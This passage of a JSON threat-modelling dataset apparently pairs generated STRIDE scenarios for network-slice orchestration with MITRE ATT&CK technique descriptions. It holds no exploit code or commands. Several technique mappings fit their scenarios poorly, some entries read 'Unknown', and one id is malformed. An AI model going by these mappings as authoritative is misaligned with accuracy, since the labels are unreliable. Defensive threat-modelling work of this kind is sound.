            "MITRE ATT&CK Keywords": [
                "information-disclosure",
                "privileged-access",
                "user-data",
                "rogue-operator"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker initiates a distributed denial of service (DDoS) attack targeting crucial VNFs.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks robust DDoS mitigation mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if mitigation systems are insufficient."
                },
                {
                    "Assumption": "VNFs do not have scalable resources to handle high traffic loads.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if resource scaling is inadequate."
                },
                {
                    "Assumption": "Network traffic is not monitored in real-time for abnormal patterns.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if real-time monitoring is lacking."
                }
            ],
            "Potential Impact": "Reduction in system availability and potential disruption of services.",
            "MITRE ATT&CK Keywords": [
                "denial-of-service",
                "ddos",
                "vnf",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider overloads the orchestration system with excessive resource allocation requests.",
            "Assumptions": [
                {
                    "Assumption": "Insider has legitimate access to orchestration system.",
                    "Role": "Insider",
                    "Condition": "Valid if access controls are weak."
                },
                {
                    "Assumption": "System does not have rate-limiting mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if rate limiting is missing."
                },
                {
                    "Assumption": "There is no real-time monitoring of resource allocation activities.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if activity monitoring is insufficient."
                }
            ],
            "Potential Impact": "Resource depletion and potential denial of service for legitimate users.",
            "MITRE ATT&CK Keywords": [
                "denial-of-service",
                "resource-allocation",
                "orchestration",
                "insider"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious actor exploits vulnerabilities in VNFs to crash or disable them.",
            "Assumptions": [
                {
                    "Assumption": "VNFs have unpatched vulnerabilities.",
                    "Role": "System Designer",
                    "Condition": "Valid if patch management is inadequate."
                },
                {
                    "Assumption": "Attacker has identified and can exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker knows the vulnerabilities."
                },
                {
                    "Assumption": "The system does not have redundancy or failover mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if redundant systems are missing."
                }
            ],
            "Potential Impact": "Disruption of services and possible breach of data availability.",
            "MITRE ATT&CK Keywords": [
                "denial-of-service",
                "vulnerabilities",
                "vnf",
                "crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the NFVO to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "NFVO has exploitable vulnerabilities.",
                    "Role": "System Designer",
                    "Condition": "Valid if security assessments are lacking."
                },
                {
                    "Assumption": "Attacker has knowledge of and can exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has detailed information."
                },
                {
                    "Assumption": "There are no mechanisms to detect and respond to privilege escalation attempts.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if intrusion detection systems are weak."
                }
            ],
            "Potential Impact": "Administrative access leading to full control over network slices.",
            "MITRE ATT&CK Keywords": [
                "elevation-of-privilege",
                "nfvo",
                "administrative-access",
                "vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A rogue VNF exploits trust boundaries to perform unauthorized operations at a higher privilege level.",
            "Assumptions": [
                {
                    "Assumption": "The system does not properly enforce trust boundaries.",
                    "Role": "System Designer",
                    "Condition": "Valid if trust enforcement is weak."
                },
                {
                    "Assumption": "Existing VNFs are able to perform actions beyond their intended privilege levels.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if privilege management is insufficient."
                },
                {
                    "Assumption": "There is no monitoring of VNF actions across trust boundaries.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if cross-boundary actions are not monitored."
                }
            ],
            "Potential Impact": "Unauthorized operations impacting multiple slices.",
            "MITRE ATT&CK Keywords": [
                "elevation-of-privilege",
                "vnf",
                "trust-boundaries",
                "unauthorized-operations"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to trick an operator into running malicious scripts with administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Operators are susceptible to social engineering tactics.",
                    "Role": "Operator",
                    "Condition": "Valid if security training is insufficient."
                },
                {
                    "Assumption": "Operators have the capability to execute scripts with administrative privileges.",
                    "Role": "System Designer",
                    "Condition": "Valid if privilege management is inadequate."
                },
                {
                    "Assumption": "There is no mechanism to verify the legitimacy of scripts before execution.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if script verification is weak."
                }
            ],
            "Potential Impact": "Execution of malicious actions with administrative impact.",
            "MITRE ATT&CK Keywords": [
                "elevation-of-privilege",
                "social-engineering",
                "scripts",
                "administrative-privileges"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--035dd844a-b219-4e2b-a6bb-efa9a75995a9",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "26",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of a trusted entity to gain unauthorized access to a network slice.",
            "Assumptions": [
                {
                    "Assumption": "Lack of robust authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "The system does not properly authenticate trusted entities."
                },
                {
                    "Assumption": "Access to network interfaces.",
                    "Role": "Attacker",
                    "Condition": "The system's external interfaces are accessible to the attacker."
                },
                {
                    "Assumption": "Knowledge of the communication protocols.",
                    "Role": "Attacker",
                    "Condition": "The attacker understands the protocols used for inter-network communication."
                }
            ],
            "Potential Impact": "Compromise of network slice confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity",
                "network",
                "access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a network function (NF) to redirect traffic.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient verification of NF identities.",
                    "Role": "Attacker",
                    "Condition": "The system does not verify the identities of NFs adequately."
                },
                {
                    "Assumption": "Access to NF interfaces.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to the interfaces used by NFs."
                },
                {
                    "Assumption": "Knowledge of network architecture.",
                    "Role": "Attacker",
                    "Condition": "The attacker has insight into the network's structure and functions."
                }
            ],
            "Potential Impact": "Interception and potential tampering of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network function",
                "redirection",
                "traffic"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the orchestration and management entity to manipulate network slice configurations.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication for the NFVO.",
                    "Role": "Attacker",
                    "Condition": "The NFVO does not enforce strong authentication."
                },
                {
                    "Assumption": "Access to management interfaces.",
                    "Role": "Attacker",
                    "Condition": "Management interfaces are accessible to unauthorized users."
                },
                {
                    "Assumption": "Lack of encryption for management communications.",
                    "Role": "Attacker",
                    "Condition": "Management communications are not encrypted, allowing attackers to intercept and manipulate them."
                }
            ],
            "Potential Impact": "Disruption of network slice operations and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "management",
                "orchestration",
                "configuration"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could alter the configuration of network slices to degrade their performance or leak sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient protection of configuration files.",
                    "Role": "Attacker",
                    "Condition": "Configuration files are easily accessible and modifiable by unauthorized entities."
                },
                {
                    "Assumption": "Access to configuration interfaces.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to the configuration interfaces of the VNFs and NFs."
                },
                {
                    "Assumption": "Lack of monitoring for configuration changes.",
                    "Role": "Attacker",
                    "Condition": "The system does not actively monitor and validate configuration changes."
                }
            ],
            "Potential Impact": "Compromise of data integrity and system performance.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration",
                "network slice",
                "performance"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could inject malicious code into virtualized network functions (VNFs).",
            "Assumptions": [
                {
                    "Assumption": "Inadequate code validation.",
                    "Role": "Attacker",
                    "Condition": "The system does not rigorously validate the code running on VNFs."
                },
                {
                    "Assumption": "Access to VNF deployment mechanisms.",
                    "Role": "Attacker",
                    "Condition": "The attacker can access and manipulate the deployment mechanisms of VNFs."
                },
                {
                    "Assumption": "Lack of runtime protection for VNFs.",
                    "Role": "Attacker",
                    "Condition": "VNFs do not have sufficient protection against runtime code modification."
                }
            ],
            "Potential Impact": "Execution of unauthorized operations and leakage of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "virtual network function",
                "malicious code"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify the orchestration policies to misallocate resources, impacting the availability of services.",
            "Assumptions": [
                {
                    "Assumption": "Weak policy enforcement mechanisms.",
                    "Role": "Attacker",
                    "Condition": "The system does not enforce orchestration policies adequately."
                },
                {
                    "Assumption": "Access to orchestration interfaces.",
                    "Role": "Attacker",
                    "Condition": "Interfaces used by the NFVO are accessible to the attacker."
                },
                {
                    "Assumption": "Lack of policy change audits.",
                    "Role": "Attacker",
                    "Condition": "The system does not audit and log policy changes effectively."
                }
            ],
            "Potential Impact": "Resource misallocation leading to service disruptions and degraded performance.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestration",
                "resource allocation",
                "policy"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could deny having made unauthorized changes to network slice configurations.",
            "Assumptions": [
                {
                    "Assumption": "Lack of transaction logging.",
                    "Role": "Attacker",
                    "Condition": "Changes to configurations are not logged effectively."
                },
                {
                    "Assumption": "Weak access control mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Access controls do not precisely attribute actions to individual users."
                },
                {
                    "Assumption": "Absence of multi-factor authentication.",
                    "Role": "Attacker",
                    "Condition": "The system does not enforce multi-factor authentication for administrative actions."
                }
            ],
            "Potential Impact": "Difficulty in tracing unauthorized changes leading to accountability issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "access control",
                "multi-factor authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider threat could claim that malicious actions performed were accidental.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of actions performed by users.",
                    "Role": "Insider",
                    "Condition": "The system does not log all user actions comprehensively."
                },
                {
                    "Assumption": "Lack of behavioral analytics.",
                    "Role": "Insider",
                    "Condition": "The system does not analyze user behavior patterns to detect anomalies."
                },
                {
                    "Assumption": "Weak incident response protocols.",
                    "Role": "Insider",
                    "Condition": "The system does not have robust protocols to respond to and investigate incidents."
                }
            ],
            "Potential Impact": "Lack of accountability and increased risk of insider threats.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "insider threat",
                "logging",
                "incident response"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--7495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could erase logs to remove evidence of unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Access to log files.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to the location where logs are stored."
                },
                {
                    "Assumption": "Weak log protection mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Logs are not adequately protected against unauthorized access and modification."
                },
                {
                    "Assumption": "Absence of log backups.",
                    "Role": "Attacker",
                    "Condition": "The system does not maintain backup copies of logs."
                }
            ],
            "Potential Impact": "Loss of forensic evidence and difficulty in reconstructing events.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log files",
                "log protection",
                "evidence"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could intercept unencrypted communication between network functions to gain sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Use of unencrypted communication channels.",
                    "Role": "Attacker",
                    "Condition": "The system does not encrypt communications between network functions."
                },
                {
                    "Assumption": "Access to the communication path.",
                    "Role": "Attacker",
                    "Condition": "The attacker can eavesdrop on the communication path used by network functions."
                },
                {
                    "Assumption": "Knowledge of communication protocols.",
                    "Role": "Attacker",
                    "Condition": "The attacker understands the protocols used for communication."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "eavesdropping",
                "communication",
                "unencrypted"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive orchestration data could be exposed due to misconfigured access controls.",
            "Assumptions": [
                {
                    "Assumption": "Improperly configured access controls.",
                    "Role": "Attacker",
                    "Condition": "Access controls for orchestration data are not configured correctly."
                },
                {
                    "Assumption": "Access to orchestration interfaces.",
                    "Role": "Attacker",
                    "Condition": "The attacker can interact with orchestration interfaces."
                },
                {
                    "Assumption": "Lack of regular access reviews.",
                    "Role": "Attacker",
                    "Condition": "The system does not regularly review and audit access permissions."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive orchestration data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "misconfiguration",
                "access control",
                "orchestration"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could exploit a vulnerability in VNFs to extract sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Existence of exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "The VNFs have unpatched vulnerabilities that can be exploited."
                },
                {
                    "Assumption": "Access to VNF instances.",
                    "Role": "Attacker",
                    "Condition": "The attacker can access VNF instances."
                },
                {
                    "Assumption": "Lack of vulnerability management.",
                    "Role": "Attacker",
                    "Condition": "The system does not have a robust vulnerability management program."
                }
            ],
            "Potential Impact": "Extraction of sensitive data from VNFs.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "exploitation",
                "vulnerability",
                "virtual network function"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
